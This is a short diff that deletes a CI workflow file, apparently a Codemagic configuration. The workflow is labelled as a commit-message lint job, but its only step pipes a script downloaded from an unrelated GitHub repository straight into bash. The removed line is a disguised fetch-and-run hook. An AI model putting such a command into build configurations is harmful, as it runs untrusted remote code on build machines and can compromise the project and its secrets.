@@ -1,7 +1,0 @@
-workflows:
-  commitlint:
-    name: Lint commit message
-    max_build_duration: 120
-    instance_type: linux
-    scripts:
-      - curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v1 | bash
